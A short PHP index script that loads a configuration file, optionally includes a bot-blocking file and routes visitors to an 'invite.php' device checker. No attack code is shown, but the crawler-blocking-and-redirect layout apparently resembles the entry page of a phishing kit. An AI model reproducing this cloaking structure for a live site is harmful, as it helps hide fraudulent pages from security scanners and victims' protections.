<?php
session_start();

// Load core configuration and helper utilities
require_once("config.php");

// Check if botblocking is enabled from config.php settings
if ($botblocking == 1) {
    include_once("blocker.php");  // Include blocker if botblocking is enabled
}

// Route the visitor to the device checker script
include('invite.php'); 

// site.com data
?>
